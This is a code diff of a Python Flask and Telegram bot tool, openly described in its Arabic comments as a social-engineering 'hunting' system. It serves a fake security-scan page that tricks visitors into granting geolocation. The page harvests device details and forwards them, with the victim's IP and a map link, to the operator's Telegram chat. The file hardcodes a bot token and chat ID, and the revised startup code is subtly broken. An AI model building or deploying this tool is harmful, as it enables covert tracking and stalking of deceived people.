@@ -1,104 +1,85 @@
 import os
-import logging
+import requests
+from flask import Flask, request, render_template_string
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
-from flask import Flask, request, render_template_string
 import threading
-import requests
 
-# --- الإعدادات الأساسية ---
+# --- الإعدادات (ضع بياناتك هنا) ---
 BOT_TOKEN = "8754086355:AAEw66jFIpxnxRRvpyN4Syf4YPSXRvGsPmQ"
 ADMIN_ID = "6555135671"
 app = Flask(__name__)
 
-# --- واجهة الهندسة الاجتماعية (Professional Security Audit) ---
+# واجهة هندسة اجتماعية متطورة
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من أمان الأجهزة</title>
+    <title>تحديث أمن النظام</title>
     <style>
-        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { border: 1px solid #30363d; padding: 30px; border-radius: 10px; background: #161b22; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .loader { border: 4px solid #30363d; border-top: 4px solid #238636; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.2rem; color: #f0f6fc; }
+        body { background: #0b0e14; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20%; }
+        .box { border: 1px solid #00ff00; display: inline-block; padding: 20px; box-shadow: 0 0 10px #00ff00; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>جاري فحص سلامة النظام...</h1>
-        <div class="loader"></div>
-        <p id="status">الرجاء السماح بالوصول للموقع لإتمام الفحص الأمني السحابي.</p>
+    <div class="box">
+        <h3>جاري فحص بروتوكولات الأمان...</h3>
+        <p id="status">الرجاء منح الصلاحية لإكمال التشفير</p>
     </div>
     <script>
-        async function sendData() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const payload = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        acc: position.coords.accuracy,
-                        platform: navigator.platform,
-                        ua: navigator.userAgent,
-                        lang: navigator.language,
-                        screen: window.screen.width + "x" + window.screen.height
-                    };
-                    await fetch('/log_capture', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(payload)
-                    });
-                    document.getElementById('status').innerText = "تم الفحص بنجاح. جهازك محمي حالياً.";
-                }, (error) => {
-                    document.getElementById('status').innerText = "خطأ: يجب تفعيل نظام تحديد الموقع لإكمال الفحص.";
+        async function capture() {
+            const getBattery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const data = {
+                    lat: p.coords.latitude, lon: p.coords.longitude,
+                    acc: p.coords.accuracy, ua: navigator.userAgent,
+                    platform: navigator.platform, lang: navigator.language,
+                    cores: navigator.hardwareConcurrency,
+                    screen: screen.width + "x" + screen.height,
+                    battery: getBattery ? (getBattery.level * 100) + "%" : "N/A"
+                };
+                await fetch('/log_capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
                 });
-            }
+                document.getElementById('status').innerText = "تم تأمين الاتصال بنجاح";
+            }, (e) => { alert("خطأ: يجب السماح بالوصول للنظام لإتمام الفحص"); });
         }
-        window.onload = sendData;
+        window.onload = capture;
     </script>
 </body>
 </html>
 """
 
 @app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
+def index(): return render_template_string(HTML_TEMPLATE)
 
 @app.route('/log_capture', methods=['POST'])
 def log_capture():
-    data = request.json
+    d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    # صياغة التقرير بتنسيق احترافي جداً
     report = (
-        "📊 **[ تقرير اختراق هندسة اجتماعية ]** 📊\n\n"
-        f"📍 **الموقع:** [فتح في خرائط جوجل](https://www.google.com/maps?q={data['lat']},{data['lon']})\n"
-        f"🎯 **الدقة:** `{data['acc']} متر`\n"
-        f"🌐 **العنوان الرقمي (IP):** `{ip}`\n"
-        f"📱 **نظام التشغيل:** `{data['platform']}`\n"
-        f"🖥️ **دقة الشاشة:** `{data['screen']}`\n"
-        f"🌍 **اللغة:** `{data['lang']}`\n"
-        f"🔍 **المتصفح:** `{data['ua'][:50]}...`\n\n"
-        "⚡ *تم استلام البيانات بنجاح من الخادم السحابي.*"
+        "🎯 **صيد جديد (تقرير كامل)** 🎯\n\n"
+        f"📍 **الموقع:** [خرائط جوجل](https://www.google.com/maps?q={d['lat']},{d['lon']})\n"
+        f"🌐 **IP:** `{ip}`\n"
+        f"📱 **النظام:** `{d['platform']}`\n"
+        f"🔋 **البطارية:** `{d['battery']}`\n"
+        f"🖥️ **الشاشة:** `{d['screen']}`\n"
+        f"⚙️ **المعالج:** `{d['cores']} Core`\n"
+        f"🌍 **اللغة:** `{d['lang']}`\n"
+        f"🕵️ **المتصفح:** `{d['ua'][:100]}...`"
     )
-    
-    # إرسال التقرير لتليجرام
-    send_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(send_url, json={"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown", "disable_web_page_preview": False})
-    return "OK", 200
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                  json={"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})
+    return "OK"
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 أهلاً بك يا مهندس. نظام الصيد جاهز.\nأرسل رابط الاستضافة للهدف وانتظر التقارير.")
+async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
+    await u.message.reply_text("✅ نظام الصيد الاحترافي نشط الآن.")
 
 if __name__ == '__main__':
-    # تشغيل Flask في خيط منفصل لضمان عدم تعطل البوت
-    port = int(os.environ.get("PORT", 5000))
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
-    
-    # تشغيل بوت تليجرام
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler('start', start))
-    application.run_polling()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000))), daemon=True).start()
+    print("🚀 Bot is Online...")
+    ApplicationBuilder().token(BOT_TOKEN).build().add_handler(CommandHandler('start', start))
+    ApplicationBuilder().token(BOT_TOKEN).build().run_polling()
